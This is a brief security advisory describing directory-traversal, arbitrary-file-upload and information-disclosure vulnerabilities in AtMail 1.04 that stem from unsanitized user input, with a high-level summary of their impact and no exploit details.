AtMail is prone to multiple directory-traversal vulnerabilities, an arbitrary-file-upload vulnerability, and an information-disclosure vulnerability because the application fails to sanitize user-supplied input.

An attacker can exploit these issues to obtain sensitive information, upload arbitrary code, and run it in the context of the webserver process.

Atmail 1.04 is vulnerable; other versions may also be affected.
